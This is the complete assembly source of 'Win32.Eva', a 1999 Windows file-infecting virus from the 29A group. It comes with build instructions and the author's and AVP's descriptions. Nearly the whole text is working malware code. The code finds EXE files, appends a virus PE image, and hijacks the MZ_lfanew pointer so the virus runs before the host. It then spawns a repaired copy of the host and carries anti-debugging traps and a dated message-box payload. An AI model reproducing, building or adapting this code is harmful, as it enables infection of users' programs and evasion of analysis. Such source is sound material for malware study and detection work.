;Win32.Eva virus.
;(c) 1999 by Benny
;
;
;Author's description
;---------------------
;
;Let me introduce my first COMPLETE Win32 infector. Yeah, i have written several parts
;of viruses, but this babe is my tiniest one with all needed functions to spread out.
;Win32.Eva is simple appender, infects one EXE file by changing pointer at 3ch
;in the MZ header, which points to new exe. After infection, MZ_lfanew pointer will be
;pointing to the viruses new PE header. So, if u will execute infected program under Win9X,
;WinNT or under Win3.1x with Win32s subsystem, program will start at the new location.
;After virus will be done with his work executes program again with changed
;MZ_lfanew pointer, that will be pointing to the original PE header.
;
;
;Payload
;--------
;
;On February the 2nd will display message box with some stupid comments.
;
;
;To build
;---------
;
;tasm32 -ml -m5 -q eva.asm
;tlink32 -Tpe -c -x -aa -r eva,,, import32
;pewrsec eva.exe	(thanx Jacky !)
;
;
;AVP's description
;------------------
;
;This is a direct action (nonmemory resident) parasitic Win32 infector. It
;searches for PE EXE files in the Windows, Windows system [* Benny's note: it
;DOESN'T infect files in Windows/System directory!] and current directories,
;then writes itself to the end of the file. While infecting the virus does not
;modify the PE header at all, the infection way is based only on DOS Stub
;header: the virus writes to there new file offset of PE header (virus PE
;header). As a result the infected file has three parts: first part is original
;DOS stub, the second part is host PE data (not modified), third part is virus
;code and data.
;
;The virus has PE file structure: it contains PE header, section headers, import
;table, code and data sections. The modified DOS stub in infected files points
;to virus PE header instead of original ones. As a result, Windows32 while
;executing infected files reads and runs virus code instead of host one.
;
;To return to the host program the virus creates a copy of the infected file,
;disinfects it (just restores file offset of PE header) and spawns.
;
;On February 2nd the virus displays the message window: 
;
; Win32.Eva by Benny, (c) 1999
;  Hello stupid user, i'm so sorry, but i have to interrupt your work,
;  'cause I hate this shitty program. Click OK to continue.
;
;  Greets to:
;          Super/29A
;          Darkman/29A
;          Jacky Qwerty/29A
;          Billy Belcebu/DDT
;          and many other 29Aers...
;
;
;Some greets
;------------
;
;All 29Aers....	And thats only the beginnin' :-)
;Super/29A..... However, blue screen is still the best Sexy's effect :-)
;
;
;Who is Eva ?
;-------------------------
;
;Eva is one pretty girl with nice black/red hair and lovely eyes.
;I hope, that this work (fully programmed and commented by three days - good
;motivation :-)) will say some words to Eva better than I X-DD. I hate myself.
;
;
;Last notes
;-----------
;
;This virus has many bugs (after many repairs without tests) and in this time, I don't care
;about it. Don't bitch if, that it doesn't work and look at my last viruses... Hey, it's my first
;virus, so gimme space for living X-D.
;
;
;And here is it...



.386p							;386 instructions
.model flat						;32bit offset, no segments


include PE.inc						;include some needed files
include MZ.inc
include Useful.inc
include win32api.inc


extrn FindFirstFileA:PROC				;and import needed APIs
extrn SetFileAttributesA:PROC
extrn CreateFileA:PROC
extrn CreateFileMappingA:PROC
extrn MapViewOfFile:PROC
extrn UnmapViewOfFile:PROC
extrn CloseHandle:PROC
extrn FindClose:PROC
extrn FindNextFileA:PROC
extrn CopyFileA:PROC
extrn GetCommandLineA:PROC
extrn CreateProcessA:PROC
extrn GetModuleFileNameA:PROC
extrn WaitForSingleObject:PROC
extrn DeleteFileA:PROC
extrn GetCurrentDirectoryA:PROC
extrn GetWindowsDirectoryA:PROC
extrn GetSystemDirectoryA:PROC
extrn GetVersion:PROC
extrn GetSystemTime:PROC
extrn MessageBoxA:PROC
extrn GetLastError:PROC
extrn GetModuleHandleA:PROC
extrn GetProcAddress:PROC
extrn SetFilePointer:PROC
extrn SetEndOfFile:PROC

.data							;data section

	msgTitle	db		'Win32.Eva by Benny, (c) 1999', 0
	msgText		db		'Hello stupid user, i''m so sorry, but i have to interrupt your work,', 0dh
			db		'''cause I hate this shitty program. Click OK to continue.', 0dh, 0dh
			db		'Greets to:', 0dh
			db		9, 'Super/29A', 0dh
			db		9, 'Darkman/29A', 0dh
			db		9, 'Jacky Qwerty/29A', 0dh
			db		9, 'Billy Belcebu/DDT', 0dh, 0dh
			db		9, 'and many other 29Aers...', 0dh, 0dh, 0

	kernel		db		'KERNEL32', 0
IsDebuggerPresent	db		'IsDebuggerPresent', 0
	fmask		db		'*.EXE',0		;search mask
	DestFile	db		'aaaaeva.exe', 0	;temporary file
	org $ - 1
	space		db		?			;space between name and params
	CmdLine		db		256 - 12 dup (?)	;command line
	win32_find_data WIN32_FIND_DATA	?
	search_handle	dd		?
	hFile		dd		?
	hMyFile		dd		?
	hMapFile	dd		?
	hMyMapFile	dd		?
	lpFile		dd		?
	lpMyFile	dd		?

lppiProcInfo:							;needed by CreateProcessA
	hProcess	dd		?
	hThread		dd		?
	dwProcessID	dd		?
	dwThreadID	dd		?
	lpFileName	db		256 dup (?)
	lpsiStartInfo	db		64 dup (?)
	lpWindowsPath	db		256 dup (?)
	lpCurrentPath	db		256 dup (?)
	org lpCurrentPath
	lpSystemTime	db		16 dup (?)		;these variables may overlap
ends

.code								;code of virus starts here
Start:
	pushad
	pushad

	@SEH_SetupFrame 				;setup SEH frame
	inc dword ptr [edx]					;bye TD32 !
	db 2dh							;some prefix

seh_rs:
	push 256
	push offset lpFileName
	push 0
	call GetModuleFileNameA					;get file-name of me

test_dir:							;i wont infect files in Windows
								;dir, 'cause NT could crash
								;on start
	mov esi, offset lpCurrentPath
	push esi
	push esi
	push 256
	call GetCurrentDirectoryA				;get current directory
	pop ebx

	push 256
	mov edi, offset lpWindowsPath
	push edi
	call GetWindowsDirectoryA				;getwindows directory

N_Char:	cmpsb							;compare
jpatch:	jne NoMatch						;no match, jump
	jne FindFile						;second jump for next test
	cmp byte ptr [esi - 1], 0				;end of string ?
	jne N_Char						;no, get next char
	jmp quit_to_host					;yeah, we're in Windows dir.,
								;jump to host

	db 68h							;some prefix
NoMatch:push 256
	mov edi, offset lpWindowsPath
	push edi
	call GetSystemDirectoryA				;get windows system dir.
	
	mov word ptr [jpatch], 9090h				;path first jump with NOPs,
								;second will take effect
	mov esi, ebx
	jmp N_Char						;and test directory
	db 8bh							;some prefix
	
FindFile:
	push offset win32_find_data
	push offset fmask
	call FindFirstFileA					;find first file
        test eax, eax
        je exit_search                                          ;no files, quit
        mov search_handle, eax                                  ;save search handle

try_infect:
	cmp win32_find_data.WFD_nFileSizeHigh, 0		;discard huge files
	jne Try_Next

	mov eax, [win32_find_data.WFD_nFileSizeLow]
	cmp eax, 4096*4						;discard small files
	jb Try_Next
	cmp eax, (64*64*512)+1					;discard huge files
	jb @1

Try_Next:
	push offset win32_find_data
	push [search_handle]
	call FindNextFileA					;try next file
        xchg eax, ecx
        jecxz exit_search					;no files, quit
	jmp try_infect						;try infect it

	db 67h							;some prefix
@1:     mov edx, offset win32_find_data.WFD_szFileName
	push edx
	push 0
	push edx
	call SetFileAttributesA					;black file attributes
	pop edx
	xchg eax, ecx
	jecxz Try_Next						;can't set attributes, try next

	call OpenFile						;open and map file
	jecxz Try_Next						;cant map file, try next
	call InfectFile						;infect file
	cmp eax, 'EVA'						;infection OK ?
	je exit_search						;no, try next

	push [lpFile]
	call UnmapViewOfFile					;unmap view of file
	push [hMapFile]
	call CloseHandle					;close file mapping object


	;error, we MUST TRUNCATE FILE BACK !
	push 0
	push 0
	push [win32_find_data.WFD_nFileSizeLow]
	push [hFile]
	call SetFilePointer					;set file pointer to original size
	push [hFile]
	call SetEndOfFile					;and truncate file
	call end_OpenFile3					;close file
	jmp Try_Next						;try next file

exit_search:
	call CloseFile						;close and unmap file
	call MyClose						;close and unmap my file

	push [win32_find_data.WFD_dwFileAttributes]
	push offset win32_find_data.WFD_szFileName
	call SetFileAttributesA					;set back file attributes

	push [search_handle]
	call FindClose						;close search handle

quit_to_host:
	push offset lpSystemTime				;test for activate payload
	call GetSystemTime					;get system time
	push 2
	pop ecx							;ecx = 2
	cmp word ptr [lpSystemTime+2], cx			;is February ?
	jne no_payload
	cmp word ptr [lpSystemTime+6], cx			;is 2nd of February
	jne no_payload
	cmp word ptr [lpSystemTime+12], cx			;2 seconds ?
	jne no_payload

	push 1000h						;system modal window
	push offset msgTitle					;title
	push offset msgText					;test
	push 0							;owner - NULL
	call MessageBoxA					;display bessage box

no_payload:
	push 0							;overwrite file, if exist already
	push offset DestFile					;destination file
cpyf:	push offset lpFileName					;source file
	call CopyFileA						;copy file
	test eax, eax						;error ? (disk full, for example)
	jne getcommandline

	call GetLastError					;get las error
	cmp eax, 32						;another process is using this file
	jne exit						;unknown error, exit

	push 0							;everwrite file
	mov edx, offset DestFile				;dest. file
	inc dword ptr [edx]					;try generate another file
	push edx
	jmp cpyf						;and try to copy file again

	db 8bh							;some prefix
getcommandline:							;now we will skip our filename
	call GetCommandLineA					;get command line
	mov esi, eax						;set source
cat:	lodsb							;get char
	cmp al, 0						;no params ?
	je run_prg
	cmp al, '"'						;long files r written with ""s
	je long_name
	cmp al, 20h						;is it space ?
	jne cat

cat1:	mov edi, offset CmdLine					;destination
	lodsb							;movsb with char in al
	stosb
	cmp al, 0						;end of params ?
	je run_prg

cat0:	lodsb							;same as previous
	stosb
	cmp al, 0
	jne cat0

run_prg:
	mov edx, offset DestFile				;edx as file to param
        mov win32_find_data.WFD_nFileSizeLow, 2048		;save num. of bytes to map
	call OpenFile						;open and map our file
	jecxz end_host						;if error, quit
	mov eax, [ecx.MZ_lfanew - 4]				;load oroginal MZ_lfanew
	mov [ecx.MZ_lfanew], eax				;and save it to that original pos.
	call CloseFile						;close and unmap file

	mov [space], 20h					;add params
	xor eax, eax
	push offset lppiProcInfo				;procinfo
	push offset lpsiStartInfo				;start info
	mov [lpsiStartInfo], SIZE lpsiStartInfo			;size of start info
	push eax						;directory
	push eax						;enviroment
	push eax						;create options
	push eax						;inherit handles ?
	push eax						;thread SA
	push eax						;process SA
	push offset DestFile					;command line
	push eax						;app name
	call CreateProcessA					;create process !
	xchg eax, ecx
	jecxz end_host						;if error, quit

	push -1							;infinite
	push [hProcess]						;child process
	call WaitForSingleObject				;wait for signaled state

	push [hThread]
	call CloseHandle					;close thread primary thread handle
	push [hProcess]
	call CloseHandle					;close process handle

end_host:
	mov edi, offset DestFile
	push edi						;file to delete
	mov byte ptr [edi+space-DestFile], 0			;add NULL between file and params
	call DeleteFileA					;delete it !

exit:	popad							;restore all registers
	ret							;otherwise this quit metod will not work !

	db 75h							;some prefix
long_name:
	lodsb							;load char
	cmp al, '"'
	jne long_name						;wait for next "
	jmp cat1

	db 73h							;some prefix
InfectFile proc
	mov ebx, ecx						;save address of MM-file
	cmp word ptr [ecx], IMAGE_DOS_SIGNATURE			;must be MZ
	jne end_InfectFile
	cmp dword ptr [ecx.MZ_lfanew-4], 0			;mustn't be infected already
	jne end_InfectFile
	mov edx, [ecx.MZ_lfanew]
	add ecx, edx
	cmp dword ptr [ecx], IMAGE_NT_SIGNATURE			;must be PE\0\0
	jne end_InfectFile
	cmp word ptr [ecx.NT_FileHeader.FH_Machine], IMAGE_FILE_MACHINE_I386	;must be 386+
	jne end_InfectFile

	movzx eax, word ptr [ecx.NT_FileHeader.FH_Characteristics]
	not al
	test eax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_DLL
	jne end_InfectFile					;must be executable, mustn't be DLL

;at this point:	
;	EBX	-	start of MM-file
;	ECX	-	PE header of MM-file

	
	mov ebp, ebx
	mov edi, ecx
	sub edi, ebx
	mov [ebx.MZ_lfanew-4], edi				;save original MZ_lfanew
	mov eax, win32_find_data.WFD_nFileSizeLow
	mov [ebx.MZ_lfanew], eax
	mov edi, ebx
	add edi, eax

	mov edx, [ebx.MZ_lfanew]
	add edx, ebx
	push edx						;push it, will be needed l8r

	call MyOpen						;open and map me

	pop edx
	jecxz end_InfectFile					;can't open, quit

	push edx
	mov esi, [ecx.MZ_lfanew]
	add esi, ecx
	push ecx
	mov ecx, (503) / 4			;PE header size + section header size
	cld
	rep movsd				;copy PE header + all section headers
	pop esi
	pop edx


;at this point:
;	EDX	-	start of our new PE header
;	EBP	-	start of MM-file (MZ header)
;	ESI	-	start of MM prg+virus (MZ header)
;	EDI	-	pointer to memory, where will be copied virus sections

	push ebp
	;from ...
	mov ecx, [esi.MZ_lfanew]
	add ecx, esi
	movzx ebx, word ptr [ecx.NT_FileHeader.FH_SizeOfOptionalHeader]	;size of optional header

	;to ...
	mov ebp, edx
	movzx edx, word ptr [edx.NT_FileHeader.FH_SizeOfOptionalHeader]	;	  ...
	mov eax, 4							;number of sections

copy_sections:
	pushad

	pushad
	call Align							;align position
	mov [esp.Pushad_edi], edi
	popad

	;from ...
	lea ebx, [ecx.NT_OptionalHeader + ebx]
	add esi, [ebx.SH_PointerToRawData]				;address of section data
	mov ecx, [ebx.SH_SizeOfRawData]					;size of section data

	;to ...
	lea edx, [ebp.NT_OptionalHeader + edx]
	mov ebx, edi
	sub ebx, [esp.cPushad.RetAddr]
	mov [edx.SH_PointerToRawData], ebx				;save pointer
	rep movsb

	mov [esp.Pushad_edi], edi
	popad
	sub ebx, -IMAGE_SIZEOF_SECTION_HEADER				;next section
	sub edx, -IMAGE_SIZEOF_SECTION_HEADER				;next section
	dec eax
	jne copy_sections

	pop ebp
	mov eax, 'EVA'							;success, toggle flag
end_InfectFile:
	ret
InfectFile EndP


	db 72h								;some prefix
Align Proc
	mov eax, edi
	mov ebx, 200h							;our align
AlignIt:xor edx, edx							;nulify idiv remaider
	push eax
	idiv ebx							;divide it !
	pop eax
	test edx, edx							;mod = 0 ?
	je end_align							;yeah, align complete
	inc eax								;no, increment address
	jmp AlignIt							;and jump back
end_align:
	mov edi, eax							;edi = new aligned address
	ret
Align EndP


	db 75h								;some prefix
MyOpen proc
	cdq								;edx = 0
	push edx							;hTemlate
	push edx							;normal attributes
	push OPEN_EXISTING						;creation options
	push edx							;SA
	push FILE_SHARE_READ or FILE_SHARE_WRITE			;share mode
	push GENERIC_READ						;desired access
	push offset lpFileName						;lpFileName
	call CreateFileA						;open it !
	inc eax								;eax = -1 ?
	je end_MyOpen3
	dec eax
	mov hMyFile, eax						;save handle
	mov esi, eax

	cdq								;edx = 0
	push edx							;lpszMapName
	push edx							;max. size low
	push edx							;max. size high
	push PAGE_READONLY						;fdwProtect
	push edx							;SA
	push esi							;hFile
	call CreateFileMappingA						;create mapping !
	xchg eax, ecx
	jecxz end_MyOpen2						;eax = 0 ?
	mov hMyMapFile, ecx						;save handle

	xor eax, eax							;eax = 0
	push eax							;bytes to map
	push eax							;offset low
	push eax							;offset high
	push FILE_MAP_READ						;dwDesiredAccess
	push ecx							;hMapObj
	call MapViewOfFile						;map it !
	mov lpMyFile, eax						;save handle
	xchg eax, ecx							;ret. value in ecx
	ret

	db 76h								;some prefix
MyClose:
	push [lpMyFile]
	call UnmapViewOfFile						;close mapped file
end_MyOpen2:
	push [hMyMapFile]
	call CloseHandle						;close mapping
end_MyOpen3:
	push [hMyFile]
	call CloseHandle						;close file
	xor ecx, ecx
	ret
MyOpen EndP


	db 75h								;some prefix
;same as previous
OpenFile proc
	xor eax, eax
	push eax
	push eax
	push OPEN_EXISTING
	push eax
	mov al, 1
	push eax
	ror eax, 1
	rcr eax, 1
	push eax
	push edx
	call CreateFileA
	cdq
	inc eax
	je end_OpenFile3
	dec eax
	mov hFile, eax

	push edx
        mov esi, win32_find_data.WFD_nFileSizeLow
	sub esi, -4096
	push esi
	push edx
	push PAGE_READWRITE
	push 0
	push eax
	call CreateFileMappingA
	cdq
	xchg eax, ecx
	jecxz end_OpenFile2
	mov hMapFile, ecx

	push esi
	push edx
	push edx
	push FILE_MAP_WRITE
	push ecx
	call MapViewOfFile
	mov lpFile, eax
	xchg eax, ecx
	ret

	db 76h								;some prefix
CloseFile:
	push [lpFile]
	call UnmapViewOfFile
end_OpenFile2:
	push [hMapFile]
	call CloseHandle
end_OpenFile3:
	push [hFile]
	call CloseHandle
	xor ecx, ecx
	ret
OpenFile EndP


	db 77h								;some prefix
seh_fn:
	@SEH_RemoveFrame			;remove SEH frame
	popad					;restore regs

	call GetVersion				;get windows version
	cmp eax, 80000000h			;is it WinNT ?
	jb NT_debug_trap			;yeah, freeze this app
	cmp ax, 0a04h				;or Win98
	jb no_debug_trap			;Win95-

debug_trap:					;Win95/98
	call IsDebugger
	mov eax, 909119cdh			;set some instructions
	jmp $ - 4				;say bye to your balls :-)

	db 2dh								;some prefix
no_debug_trap:
	jmp seh_rs				;jump back

	db 2dh					;some prefix
NT_debug_trap:
	call IsDebugger
	xor esp, esp				;this will freeze our app
	push ecx				;if not, this will cause
						;access violation exception
IsDebugger:
	pop ebx
	push offset kernel
	call GetModuleHandleA			;get memory address of kernel32
	xchg eax, ecx
	jecxz no_debug_trap			;error, jump
	push offset IsDebuggerPresent
	push ecx
	call GetProcAddress			;get procedure address of our API
	xchg eax, ecx
	jecxz no_debug_trap
	call ecx				;call IsDebuggerPresent
	xchg eax, ecx
	jecxz no_debug_trap
	jmp ebx
ends
End Start





